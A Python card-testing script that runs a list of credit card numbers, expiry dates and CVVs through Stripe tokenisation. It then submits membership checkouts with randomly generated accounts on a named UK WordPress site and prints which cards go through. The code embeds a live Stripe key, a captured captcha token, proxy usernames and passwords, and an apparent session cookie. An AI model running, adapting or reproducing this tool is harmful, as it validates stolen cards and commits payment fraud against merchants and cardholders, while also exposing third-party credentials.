from multiprocessing import Process
from bs4 import BeautifulSoup
import json
import requests
import random
import string
def get_card_type(card_number):
    card_number = str(card_number)

    if card_number.startswith('4') and len(card_number) in [13, 16, 19]:
        return "Visa"
    elif (51 <= int(card_number[:2]) <= 55 or 2221 <= int(card_number[:4]) <= 2720) and len(card_number) == 16:
        return "MasterCard"
    elif card_number.startswith(('34', '37')) and len(card_number) == 15:
        return "American Express"
    elif card_number.startswith('6011') or \
         (622126 <= int(card_number[:6]) <= 622925) or \
         card_number.startswith(('644', '645', '646', '647', '648', '649', '65')) and len(card_number) == 16:
        return "Discover"
    elif card_number.startswith(('300', '301', '302', '303', '304', '305', '36', '38')) and len(card_number) == 14:
        return "Diners Club"
    elif card_number.startswith('35') and len(card_number) == 16:
        return "JCB"
    else:
        return "Unknown Card Type"
def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))
def generate_random_email():
    domains = ["gmail.com", "yahoo.com", "outlook.com", "example.com"]
    username = generate_random_string(8)
    domain = random.choice(domains)
    return f"{username}@{domain}"
def generate_random_username():
    return generate_random_string(8)
def generate_random_password(length=12):
    characters = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(characters) for _ in range(length))

def get_token(ccs,proxies):
 cc= ccs.split("|")[0]
 mes=ccs.split("|")[1]
 ano= ccs.split("|")[2]
 cvv=ccs.split("|")[3]
 base_url = "https://api.stripe.com/v1/payment_methods"
 h = {
 "User-Agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
 "Content-Type":"application/x-www-form-urlencoded"
 }
 p = f"type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=NA&muid=99f33158-4848-4b42-8431-4ee27404e25d9c7549&sid=3e06ba9e-427f-4074-98ec-af5b4d9de5076f70b2&payment_user_agent=stripe.js/792ca756f1;+stripe-js-v3/792ca756f1;+split-card-element&referrer=https://constructiontest.co.uk&time_on_page=56257&key=pk_live_51HdlIAIp3rQqxTHDy00d0h4a1Ug7VESCtZKMWKLw1Ltr2UtjyS0HaFYKuf6b2PmZPB4A5fsZYp6quGHl1PyYq1MK00vom2WR7s&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiQTZUNFBscm1UMXJBOVBZcHhXRHNPbzI1bEhmTVhnRGVJRm1BUldtS3YxbEVYcnpwZkcyNmNaYWJvWVFuaGpyRFdSOEhWVUNRRkxJWUJaajluWDNncUlOc0dITkR6MVNGQTBOOE9JT2NzemNUbUJJeHkyREtQdENoayttaEZncERTTkxtckFpZXpUSlBGc2xTQlA4ZFBHWGhZQ2tyWFlJNkRlWEVSLzg1NUVoUUJyUjJzUWQrL29aTHJMcTg4MzZUVmFEMDM4T2l6NWxpSjIwUVV4ODZqZVRReXptbkVlSkd5WG1LMWRnZUZLL3ZpTmVsNXdXazY2cnd2Sm9BUjBzN0tSUmJMNFFHTjdab0xmamcvMkpwVU9vNTFUcHdNRmpDZDVURkppRm9VOWNwaWNLR0ZCcTJTMnh2R29vdGkweGQ5cGYvWVV3cFpmKzNvalhaWlg5b2VWY0lsYW9tTE1NdUlJNHlMVTQ5T2tmZTNIbUJFdnFXOUh2UjUrTzNNcUMzQ1RUL0VEL3QwWXlJbStZemlVb21xcmc0UjBFaWY0bXl4TE15M1R4a01pVFF3VUtydTAwSVRDTGZnSm1PSUFCRzhoNkNlV1RIcWRIaGZoWklWZUJpRjEydzVjSk85bVNXSEl4d0dISjVvVlh0RXlJTWlibGpvNFJxT0pjN1BxeDl1MXhVb3hTRjR3dzdVc0VIYTdEaUljYXM0NHBKcHFiajNWdE9sYXB0Z2dXQjM5WkJid0tLYWtTd2JETTM2NXVLZWd0NkxVY29uM1pHelU4a0VwcG9LdkV0eG5iWmhZWHJ3bGdEZXNFWDAydDdGMXdiT3I0aWlHUk5IczRYTjVWZHQxNk44NStlNHVDbUE0Q1hIdGFJK1loQW1hdjZKQmVrYng0VGFDSjJUWE9rU1VocHZ4OVNKWXFIUHREcGxma2x1OTZ5YlYxVnZhM0FWdVJZU1NQY3hxcFMwbWtqWWkvZWZKTHJnUWJ1L1lROWxFZHlLZGoxMTVWZ1Z0Z0V6ZEZiMmlMdzNYK2ZhZzhMTHRnRVh0Qy9hSzQ4cXc5QXRId0FVZW8veGRVUXJMbG5pVlVGaEhCbWZQWVlQTHhlUU9WK09HLzdOaDdmU1Y5SDlIMFVrbFlUcHc4a3FxbTlUblY1YzVJWkF1a2NhY05WNFFHcEMrRU5XRXhBSlJ4ZDNmMWZjQjVub0hFSXpwOHB1Z3ZSVlM4Uk9HVlJvUDlHR2h3NllaRkplVll0SU1LaVlFenpaMk9Fa0ZLUXlaN0VPekc3TTZwNGxBbmtORWY1bXRKU3Q5MnFxdWE4UHM1cU1EVDcwRjZFMTRNY283ZFBLSVlUSWpITkpHdDcrT2poTXFOdTU5S2tkWXhiNUN6bW05U0p1RHZiUWZ0VmswQTJjcW5KY0J6VExSbUIrTUJnRlVoRWIzb2R2R016UUF4K0sxejAvZERTRWtDaHFiM1g0NWJRV1lFdzNvL3gxQXdZNFF3U1dqb2QwSWhKS2xkYmJocjJNR3NUSlJsKzRUZ1VtRGEzV29MR2REN1hFMUprWnhIaE1ZSmJzVDh1WjZXaElFbVhBbk5vZHhPR1hLTy9yRTkzWlIrbE1FMk9tcWVrQ0FVY0laWVI5eC93aVJJRms0Z0lPbFk5NnMrcnV1UGZHTE9yKzJINkpvRkNvVkE1VDRQaXhDckpBU1lXU1djK0JsSW16ZU9aRVY5cW0rWmpKVG4xZlNseFdDUzJCclQyVVdXd3ludzZSdmlacjdvWUFiVkk2UU9iQXJ0eTZaTmtyUlFvVzdleFhtRFpTakpibWNxZDVhOTFudGJBVDFZcDB5c3g2UDJuQjRualZqaTl3eHQ4OHVoMEhGRWFpZHhheTBrdUtxdzJpQ0czOHZ3NFQ0SHRJNUJvQ1U2SVFhUE1qckNnMGI3akRBRHV6VEM4OTNSZytmWlpQdUxrKzBSemhZM1c4RFpEMm1wb3k2WXpvcys4dG9hNWxuT2tUWVNZdVR2T1NQS3lrVERsRXNIUW5VZUNDdCtlWCtQZmdnaklpNTJIajV0WUlhVjZNK25lMFpFdHViWHRjUU51Uit5dDQ1WVhmTE90YStpb25SMzkvbUswYjFocXRmSnMrdkd2V0lTZGJ3eEp4ZjFDREgxVWVWSWJoRXI3V1lmem94REs1OHpGc3Q3T1dreGw3eWlTaVFCMitQL24yQTRhNW5mVCtiYVdqMDdqMHZDeHRHRFFiK2F6U3JkMThWOG1oTGhoUHBPMThobG9HSGZaenR6ZDlGb1VuVHlsNkZjVXFWZ2dpdWIrUk9UZ0hJRFRKdy91cXo2NHc2SFlnVmpIWGgraVBXQWV2NHVSVjZCbExyZWhzK014dzYxSkl4b1JPWWx4ejVHME83UXdZQjZGTjRydndZZ04zMVBCTm5xTUhCREdINm9mYXovRXVOOXpoaUZaSVRQRTJNU2dqZWpZOUVHQ2Q2R0laeWZOaWRsTWY0K0UvdFFScW5EN3VTbitqWjg2amF4ZmhJT0Q0UHJPNmF3N3V4WSttNGtyUXpQei9KK3lLcnMzSTdpY1lBaGhXSW5pelNQWEZVOXBaa2FKbHdEMlVuSkV1cDZDVFNjdEc2ZmVsb0JxbmFjcXp3dWtmVVRpZ04vckJhQnlJY3grUFFhREMvNE9jdFhxZUY4eUtEQTBUdldHUjhldjJFeVMyZWEwMDJMNmQvMjN6R0VtMEljRWFraWNvbEVmYWphYUNxOFgiLCJleHAiOjE3MjM5OTg0NDEsInNoYXJkX2lkIjozNjI0MDY5OTYsImtyIjoiYmVjNjQyMCIsInBkIjowLCJjZGF0YSI6ImhsbURjUHdpeFhsY1RmcXd3cCswK2Y1UTNWL3NQSEtrVmg2RDZZU2xqTC8zZ1dTOGlRNzZhRUVKZkJoanZKSTlBV3JOTkNSNkpER2lZMDcyU0NOVzhXSDh3Q1hZQzY3dFQyM0kybUxLNGpTS2VreEcrVnJHOHB6RzE3RGpTVTcvMEtLKy9LdUkwZEZTWUlaZ1FIKzY1Lzlvb25nTzJRN241b1hCQjJVNVd5ZDVaYkJLUGZlcjFXZDVJVVFjdElWcUU4LzdBMHJkRmppWDJhRXkifQ.fM0J6l17zrBWC5911ukgLFw3yWv7YG81OxsKbfLrrd4"
 r = requests.post(base_url,data=p,headers=h,proxies=proxies)
 try:
  return json.loads(r.text)["id"]
 except:
  return r.text
def mainchk(pm,ccs,email,passs,user,cardtype,proxies):
 lastfour = ccs.split("|")[0][-4:]
 mes=ccs.split("|")[1]
 ano= ccs.split("|")[2]
 h = {
 "User-Agent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
 "Content-Type":"application/x-www-form-urlencoded"
# "Cookie":"_ga=GA1.1.241693377.1723997652; __gads=ID=a26be4a00db0858c:T=1723997653:RT=1723997653:S=ALNI_MbLYGYOgRH8evsL7G15Gcm6Q94f2A; __gpi=UID=00000ec4089c8758:T=1723997653:RT=1723997653:S=ALNI_MbxfgXykigvldBBxJnXlpxKLUVdxw; __eoi=ID=8ac292660267c098:T=1723997653:RT=1723997653:S=AA-AfjYxLuKowzJXkYVphO3uxMCa; FCNEC=%5B%5B%22AKsRol-clJagiaub6ZrVvuvRo_i3OK6XppLBdX3XnAC8IHqo1JJO7aSowLCJjEbWK7IY2emw9GuhIoWFEIun9lVgnBwIrOUnI6M1BIeKwdZKFLIICP9EofcLBmx0nFmh27Sqp2kY1wEWzCLjoFYPKroVRRxhMPC5tQ%3D%3D%22%5D%5D; __stripe_mid=99f33158-4848-4b42-8431-4ee27404e25d9c7549; __stripe_sid=3e06ba9e-427f-4074-98ec-af5b4d9de5076f70b2; wordpress_logged_in_97ffb3050ada2eaf6cf3503fd2ccdb77=amanmondal%7C1725207376%7CEjMMcsxHUKcXHkolh14etdXyDJrDlqZs6E3V6E5HQrv%7C42a2cb08c6f21d3070f00718793f4a75fd4ffbca9dd9d73f205f12500f1e1611; PHPSESSID=pqhnvfh79og555bfb8k73vsrmb; pmpro_visit=1; _ga_YDVXGL4CTD=GS1.1.1723997651.1.1.1723998302.0.0.0"
 }
 p = f"level=5&levelstodel=&checkjavascript=1&other_discount_code=&username={user}&password={passs}&password2={passs}&bemail={email}&bconfirmemail={email}&fullname=&gateway=stripe&CardType={cardtype}&pmpro_discount_code=&submit-checkout=1&javascriptok=1&javascriptok=1&submit-checkout=1&javascriptok=1&javascriptok=1&payment_method_id={pm}&AccountNumber=XXXXXXXXXXXX{lastfour}&ExpirationMonth={mes}&ExpirationYear={ano}"
 r = requests.post("https://constructiontest.co.uk/membership-checkout/?level=5",data=p,headers=h,proxies=proxies)
 soup = BeautifulSoup(r.text, 'html.parser')
 try:
  message_div = soup.find('div', {'id': 'pmpro_message', 'class': 'pmpro_message pmpro_error'})
  message_text = message_div.text
  print(f"\033[47m\033[31m{ccs} -> {message_text}\033[0m   ")
 except:
  if "Thank you for your membership to Construction Test." in r.text:
   print(f"{ccs} -> Thank you for your membership to Construction Test.")
  elif "Customer authentication is required to complete this transaction." in r.text:
   print(f"{ccs} -> CVV LIVE OTP AUTHENTICATION IS REQUIRED")
  else:
   print("GOT NEW TYPE RESPOND CHRCK FOLDER FOR HTML FILE")
   with open(str(lastfour) + ".html", "w") as file:
     file.write(r.text)


file_name = "cc.txt"
with open(file_name, 'r') as pass_file:
  passwords = [i.strip() for i in pass_file]

with open("proxy.txt", 'r') as pass_file:
  proxies_list = [i.strip() for i in pass_file]
i=0
for cc in passwords:
#  try:
#   random_proxy = proxies_list[i]
  proxies = {
     'http': f'http://purevpn0s13830845:6phsLWXBQEq4MR@prox-sg.pointtoserver.com:10799',
     'https': f'http://purevpn0s13830845:6phsLWXBQEq4MR@prox-sg.pointtoserver.com:10799'
  }
#  except:
#   i=0
#   random_proxy = proxies_list[i]
#   proxies = {
#     'http': f'http://ouwlgtzj-rotate:54xi4ni2l1yt@p.webshare.io:80',
#     'https': f'http://ouwlgtzj-rotate:54xi4ni2l1yt@p.webshare.io:80'
#   }
#  i+=1
  pm = (get_token(cc,proxies))
  email = generate_random_email()
  user = generate_random_username()
  passs = generate_random_password()
  c= cc.split("|")[0]
  cardtype = get_card_type(c)
  mainchk(pm,cc,email,passs,user,cardtype,proxies)
